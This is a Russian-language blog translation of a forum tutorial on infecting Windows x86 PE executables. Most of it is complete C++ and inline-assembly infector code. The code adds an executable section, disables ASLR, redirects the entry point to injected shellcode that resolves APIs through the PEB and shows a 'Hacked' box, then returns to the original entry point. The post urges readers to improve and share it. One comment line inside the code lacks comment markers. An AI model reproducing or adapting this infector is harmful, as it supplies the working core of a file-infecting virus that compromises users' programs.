---
layout: post
title: Еще один детальный гайд по заражению PE
category: [translations]
tag: [windows, malware]
---

Я передаю привет всем друзьям сайта rohitab.com!

Сегодня я хочу вам объяснить подробно, что такое заражение PE. Тема довольна сложная, но в конце концов интересная!

Требования, чтобы понять это руководство:

    Отличные знания о PE
    Хорошее знание языка ассемблера
    Хорошее знание работы памяти, указателей и файловых операций
    Терпение

Начнем!

Для начала мы добавим новую, пустую PE секцию. Получив путь к файлу, мы полностью его читаем, проверяем DOS сигнатуру, чтобы убедиться в валидности PE, проверяем, является ли он исполняемым x86 файлом (это очень важно, так как мы будем внедрять x86 опкоды в пустую секцию), проверяем, существует ли уже секция, которую мы хотим создать, и если все проверки пройдены - мы создаем новую секцию, с заданным размером и характеристиками. Код прокомментирован и хорошо объясняет происходящее. 

Все это делается функцией AddSection. Стоит отметить, что метод описанный здесь использует файл на диске, без маппинга его в память и производит чтение/запись там же. Он также сильно опирается на файловые указатели. 

Вторая и самая сложная часть - это добавление кода в только что созданную секцию.
Чтобы доказать работоспособность этого метода, я делаю следующее:

    Добавляю новую секцию
    Берем и сохраняем адрес оригинальной точки входа из Optional Header (это адрес, откуда программа начинает работу)
    Меняем OEP (оригинальную точку входа), чтобы она указывала на нашу новую секцию, поэтому когда пользователь запустит программу, она начнет выполнять наш код и делать все что мы захотим ДО того, как начнется выполнение оригинального кода, потом идет возврат к оригинальной точке входа и программа работает, как ни в чем небывало! В данном конкретном случае, я показываю всплывающее окно с надписью "Hacked"! 

ВАЖНО

Так как kernel32 загружается каждый раз при перезагрузке по разным адресам, нам надо ДИНАМИЧЕСКИ получать ее базовый адрес из PEB, чтобы мы могли найти функцию в таблице экспорта под названием LoadLibraryA, вызвать ее с аргументом "user32.dll", и потом достать адрес функции MessageBoxA из user32.dll, используя GetProcAddress.
ВСЕ ЭТО ДОЛЖНО БЫТЬ СДЕЛАНО ВНУТРИ НОВОЙ PE СЕКЦИИ, КОТОРУЮ МЫ СОЗДАЛИ !!! 

Каким образом мы можем это сделать? Нам надо получить опкоды из кода ассемблерных вставок и затем скопировать их в новую секцию.  

Это можно сделать с помощью шикарного кода, написанного wap2k, который я называю самочитаемым (self-read, запомните это название - прим. пер.):

DWORD start(0), end(0);
    __asm{
        mov eax, loc1
        mov[start], eax
        // мы пропускаем вторую ассемблерную вставку (__asm), чтобы не исполнять ее в самом коде инфектора (инфектор от слова infect - заражать)
        jmp over
        loc1:
    }
 
    __asm{
        // опкоды, который мы хотим создать и скопировать в новую секцию
    }
 
    __asm{
        over:
        mov eax, loc2
        mov [end],eax
        loc2:
    }

Мы создаем две метки в коде. Одна указывает на начало секции с опкодами, другая на конец. Вторая ассемблерная вставка (__asm в середине) - это что нас интересует. Когда мы отнимаем адрес конца от адреса начала - мы получаем смещение, по которому мы должны скопировать подходящий код (в середине), без копирования остальных опкодов, чтобы не нарушить целостность внедряемого кода.

Мы перепрыгиваем код в середине, чтобы не исполнять его при заражении, используя инструкцию jmp (jmp на метку "over").

Теперь, внутри секции в середине, мы ищем базовый адрес kernel32.dll, ищем функции LoadLibraryA и GetProcAddress для получения адреса MessageBoxA и вызова его с нужным текстом! 

После того, как мы нашли и вызвали эти функции (вызов и поиск производится зараженным PE, надеюсь вы это уже поняли), нам надо прыгнуть назад к оригинальному коду программы (входной точке)!

Так как значение OEP (оригинальная точка входа) хранится в переменной внутри кода инфектора и если мы хотим ссылаться на него из опкодов, то код для самочтения заполнит недействительный адрес, так как мы укажем на то, что существует только здесь, а не на секцию данных зараженной программы. Решение: мы поместим заглушку со значением 0xdeadbeef, чтобы позже перезаписать туда OEP.

Мы будем перезаписывать заглушку вот так:

if (*invalidEP == 0xdeadbeef){
            DWORD old;
            VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &old);
            *invalidEP = OEP;
        }

Код прокомментирован, но я буду подробно объяснять проблемные участки!
Я сейчас на работе и писал это руководство быстро, как только мог, поэтому буду рассказывать подробно !!!

Вот сам код:

#include <windows.h>
#include <imagehlp.h>
#include <winternl.h>
#include <stdio.h>
#pragma comment(lib, "imagehlp")
 
DWORD align(DWORD size, DWORD align, DWORD addr){
    if (!(size % align))
        return addr + size;
    return addr + (size / align + 1) * align;
}
 
int AddSection(char *filepath, char *sectionName, DWORD sizeOfSection){
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE){
        CloseHandle(file);
        return 0;
    }
    DWORD fileSize = GetFileSize(file, NULL);
    if (!fileSize){
        CloseHandle(file);
        // пустой файл, что делает его недействительным
        return -1;
    }
    // теперь мы знаем сколько памяти нам надо для буфера
    BYTE *pByte = new BYTE[fileSize];
    DWORD dw;
    // читаем весь файл, чтобы получить доступ к информации о PE
    ReadFile(file, pByte, fileSize, &dw, NULL);
 
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE){
        CloseHandle(file);
        return -1; // невалидный PE
    }
    PIMAGE_NT_HEADERS NT = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
    if (NT->FileHeader.Machine != IMAGE_FILE_MACHINE_I386){
        CloseHandle(file);
        return -3;// 64 битный файл
    }
    PIMAGE_SECTION_HEADER SH = IMAGE_FIRST_SECTION(NT);
    WORD sCount = NT->FileHeader.NumberOfSections;
    
    // проходим по всем доступным секциям и смотрим, существует ли уже та, которую мы хотим добавить
    for (int i = 0; i < sCount; i++){
        PIMAGE_SECTION_HEADER x = SH + i;
        if (!strcmp((char *)x->Name, sectionName)){
            //PE секция уже существует
            CloseHandle(file);
            return -2;
        }
    }
 
    ZeroMemory(&SH[sCount], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&SH[sCount].Name, sectionName, 8);
    // Мы используем 8 байт для имени секции, потому что это максимально разрешенная длина
 
    // вставляем всю необходимую информацию о нашей новой PE секции
    SH[sCount].Misc.VirtualSize = align(sizeOfSection, NT->OptionalHeader.SectionAlignment, 0);
    SH[sCount].VirtualAddress = align(SH[sCount - 1].Misc.VirtualSize, NT->OptionalHeader.SectionAlignment, SH[sCount - 1].VirtualAddress);
    SH[sCount].SizeOfRawData = align(sizeOfSection, NT->OptionalHeader.FileAlignment, 0);
    SH[sCount].PointerToRawData = align(SH[sCount - 1].SizeOfRawData, NT->OptionalHeader.FileAlignment, SH[sCount - 1].PointerToRawData);
    SH[sCount].Characteristics = 0xE00000E0;
 
    /*
    0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                 IMAGE_SCN_CNT_CODE  |
                 IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                 IMAGE_SCN_MEM_EXECUTE |
                 IMAGE_SCN_CNT_INITIALIZED_DATA |
                 IMAGE_SCN_MEM_READ
    */
 
    SetFilePointer(file, SH[sCount].PointerToRawData + SH[sCount].SizeOfRawData, NULL, FILE_BEGIN);
    // устанавливаем конец файла на последнюю секции + размер файла
    SetEndOfFile(file);
    // теперь меняем размер образа, чтобы он соответствовал нашим модификациям,
    // добавлением новой секции. Размер теперь стал больше
    NT->OptionalHeader.SizeOfImage = SH[sCount].VirtualAddress + SH[sCount].Misc.VirtualSize;
    // так как мы добавляем новую секцию, то меняем их количество
    NT->FileHeader.NumberOfSections += 1;
    SetFilePointer(file, 0, NULL, FILE_BEGIN);
    // и в конечном итоге записываем результат наших модификаций в файл
    WriteFile(file, pByte, fileSize, &dw, NULL);
    CloseHandle(file);
    return 1;
}
 
bool AddCode(char *filepath){
    HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE){
        CloseHandle(file);
        return false;
    }
    DWORD filesize = GetFileSize(file, NULL);
    BYTE *pByte = new BYTE[filesize];
    DWORD dw;
    ReadFile(file, pByte, filesize, &dw, NULL);
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
 
    // ОЧЕНЬ ВАЖНО
    // ЕСЛИ ВКЛЮЧЕН ASLR - ЭТО РАБОТАТЬ НЕ БУДЕТ !!!
    // Решение: Отключайте ASLR =))
    nt->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
 
    // так как мы добавили новую секцию, она будет последней
    // поэтому мы должны добраться до последней секции и вставить наши секретные данные :)
    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
    PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);
 
    SetFilePointer(file, 0, 0, FILE_BEGIN);
    //сохраняем оригинальную точку входа
    DWORD OEP = nt->OptionalHeader.AddressOfEntryPoint + nt->OptionalHeader.ImageBase;
 
    // мы меняем оригинальную точку входа на адрес последней секции
    nt->OptionalHeader.AddressOfEntryPoint = last->VirtualAddress;
    WriteFile(file, pByte, filesize, &dw, 0);
 
    // получаем опкоды
    DWORD start(0), end(0);
    __asm{
        mov eax, loc1
        mov[start], eax
        мы пропускаем вторую ассемблерную вставку (__asm), чтобы не исполнять ее в самом коде инфектора
        jmp over
        loc1:
    }
 
    __asm{
        /*
            Смысл этого куска кода в чтении базового адреса kernel32.dll
            из PED, просмотр таблицы экспорта (EAT) и поиск функций
        */
        mov eax, fs:[30h]
        mov eax, [eax + 0x0c]; 12
        mov eax, [eax + 0x14]; 20
        mov eax, [eax]
        mov eax, [eax]
        mov eax, [eax + 0x10]; 16
 
        mov   ebx, eax; Берем базовый адрес kernel32
        mov   eax, [ebx + 0x3c]; VMA (virtual memory address - адрес виртуальной памяти - прим.пер.) заголовка PE
        mov   edi, [ebx + eax + 0x78]; Относительное смещение таблицы экспорта
        add   edi, ebx; VMA таблицы экспорта
        mov   ecx, [edi + 0x18]; количество имен
 
        mov   edx, [edi + 0x20]; Относительное смещение таблицы имен
        add   edx, ebx; VMA таблицы имен
        // теперь давайте посмотрим на функцию LoadLibraryA
 
        LLA :
        dec ecx
            mov esi, [edx + ecx * 4]; сохраняем относительное смещение имени
            add esi, ebx; Устанавливаем в esi - VMA текущего имени 
            cmp dword ptr[esi], 0x64616f4c; обратный порядок байт L(4c)o(6f)a(61)d(64)
            je LLALOOP1
        LLALOOP1 :
        cmp dword ptr[esi + 4], 0x7262694c
            ;L(4c)i(69)b(62)r(72)
            je LLALOOP2
        LLALOOP2 :
        cmp dword ptr[esi + 8], 0x41797261; третье слово = a(61)r(72)y(79)A(41)
            je stop; прыгаем на метку stop, потому что мы нашли его
            jmp LLA; Load Libr aryA
        stop :
        mov   edx, [edi + 0x24];   Таблица относительных порядковых номеров функций
            add   edx, ebx; Таблица порядковых номеров функций
            mov   cx, [edx + 2 * ecx]; порядковый номер функции
            mov   edx, [edi + 0x1c]; Таблица относительных адресов смещений
            add   edx, ebx; Таблица адресов
            mov   eax, [edx + 4 * ecx]; смещение порядкового номера
            add   eax, ebx; VMA функции
            // теперь EAX содержит адрес LoadLibraryA
 
 
            sub esp, 11
            mov ebx, esp
            mov byte ptr[ebx], 0x75; u
            mov byte ptr[ebx + 1], 0x73; s
            mov byte ptr[ebx + 2], 0x65; e
            mov byte ptr[ebx + 3], 0x72; r
            mov byte ptr[ebx + 4], 0x33; 3
            mov byte ptr[ebx + 5], 0x32; 2
            mov byte ptr[ebx + 6], 0x2e; .
            mov byte ptr[ebx + 7], 0x64; d
            mov byte ptr[ebx + 8], 0x6c; l
            mov byte ptr[ebx + 9], 0x6c; l
            mov byte ptr[ebx + 10], 0x0
 
            push ebx
 
            //вызываем LoadLibraryA с аргументом user32.dll
            call eax;
            add esp, 11
            //сохраняем адрес возврата LoadLibraryA для последующего использования в GetProcAddress
            push eax
 
 
            // снова ищем функцию GetProcAddress
            mov eax, fs:[30h]
            mov eax, [eax + 0x0c]; 12
            mov eax, [eax + 0x14]; 20
            mov eax, [eax]
            mov eax, [eax]
            mov eax, [eax + 0x10]; 16
 
            mov   ebx, eax; базовый адрес kernel32
            mov   eax, [ebx + 0x3c]; VMA заголовка PE
            mov   edi, [ebx + eax + 0x78]; Относительное смещение таблицы экспорта
            add   edi, ebx; VMA таблицы экспорта
            mov   ecx, [edi + 0x18]; Количество имен
 
            mov   edx, [edi + 0x20]; Относительное смещение таблицы имен
            add   edx, ebx; VMA таблицы имен
        GPA :
        dec ecx
            mov esi, [edx + ecx * 4]; сохраняем относительное смещение имени
            add esi, ebx; Устанавливаем в esi - VMA текущего имени 
            cmp dword ptr[esi], 0x50746547; обратный порядок байт G(47)e(65)t(74)P(50)
            je GPALOOP1
        GPALOOP1 :
        cmp dword ptr[esi + 4], 0x41636f72
            // помните про обратный порядок : ) r(72)o(6f)c(63)A(41)
            je GPALOOP2
        GPALOOP2 :
        cmp dword ptr[esi + 8], 0x65726464; третье слово = d(64)d(64)r(72)e(65)
            // нет необходимости искать далее, так как больше нет функций, начинающихся с GetProcAddre
            je stp; если нашли, то прыгаем на метку stp
            jmp GPA
        stp :
            mov   edx, [edi + 0x24]; Таблица относительных порядковых номеров функций
            add   edx, ebx; Таблица порядковых номеров функций
            mov   cx, [edx + 2 * ecx]; порядковый номер функции
            mov   edx, [edi + 0x1c]; Таблица относительных адресов смещений
            add   edx, ebx; Таблица адресов
            mov   eax, [edx + 4 * ecx]; смещение порядкового номера
            add   eax, ebx;  VMA функции
            // теперь EAX содержит адрес GetProcAddress
            mov esi, eax
 
            sub esp, 12
            mov ebx, esp
            mov byte ptr[ebx], 0x4d //M
            mov byte ptr[ebx + 1], 0x65 //e
            mov byte ptr[ebx + 2], 0x73 //s
            mov byte ptr[ebx + 3], 0x73 //s
            mov byte ptr[ebx + 4], 0x61 //a
            mov byte ptr[ebx + 5], 0x67 //g
            mov byte ptr[ebx + 6], 0x65 //e
            mov byte ptr[ebx + 7], 0x42 //B
            mov byte ptr[ebx + 8], 0x6f //o
            mov byte ptr[ebx + 9], 0x78 //x
            mov byte ptr[ebx + 10], 0x41 //A
            mov byte ptr[ebx + 11], 0x0
 
            /*
                Достаем значение, сохраненное после возврата LoadLibraryA
                Вызов GetProcAddress выглядит так:
                esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
            */
 
            mov eax, [esp + 12]
            push ebx; MessageBoxA
            push eax; базовый адрес user32.dll, который получили с помощью LoadLibraryA
            call esi; адрес GetProcAddress :))
            add esp, 12
 
        sub esp, 8
        mov ebx,esp
        mov byte ptr[ebx], 72; H
        mov byte ptr[ebx + 1], 97; a
        mov byte ptr[ebx + 2], 99; c
        mov byte ptr[ebx + 3], 107; k
        mov byte ptr[ebx + 4], 101; e
        mov byte ptr[ebx + 5], 100; d
        mov byte ptr[ebx + 6], 0
 
        push 0
        push 0
        push ebx
        push 0
        call eax
        add esp, 8
 
        mov eax, 0xdeadbeef ; Оригинальная точка входа
        jmp eax
    }
 
    __asm{
        over:
        mov eax, loc2
        mov [end],eax
        loc2:
    }
 
    byte mac[1000];
    byte *fb = ((byte *)(start));
    DWORD *invalidEP;
    DWORD i = 0;
 
    while (i < ((end - 11) - start)){
        invalidEP = ((DWORD*)((byte*)start + i));
        if (*invalidEP == 0xdeadbeef){
            /*
                Так как значение OEP (оригинальная точка входа) хранится в переменной внутри кода инфектора и если мы хотим ссылаться на него из опкодов, то часть программы для самочтения заполнит недействительный адрес, так как мы укажем на то, что существует только здесь, а не на раздел данных зараженной программы. Решение: мы поместим заглушку со значением 0xdeadbeef, чтобы позже перезаписать туда OEP.
            */
            DWORD old;
            VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &old);
            *invalidEP = OEP;
        }
        mac[i] = fb[i];
        i++;
    }
    SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
    WriteFile(file, mac, i, &dw, 0);
    CloseHandle(file);
    return true;
}
 
void main(){
    char *file = "C:\\Users\\M\\Desktop\\Athena.exe";
    int res = AddSection(file, ".ATH", 400);
    switch (res){
    case 0:
        printf("Error adding section: File not found or in use!\n");
        break;
    case 1:
        printf("Section added!\n");
        if (AddCode(file))
            printf("Code written!\n");
        else
            printf("Error writting code!\n");
        break;
    case -1:
        printf("Error adding section: Invalid path or PE format!\n");
        break;
    case -2:
        printf("Error adding section: Section already exists!\n");
        break;
    case -3:
        printf("Error: x64 PE detected! This version works only with x86 PE's!\n");
        break;
    }
}

Пробуйте, улучшайте, делайте свое и самое главное: ДЕЛИТЕСЬ ЭТИМ С ДРУГИМИ!

Счастливого кодинга!

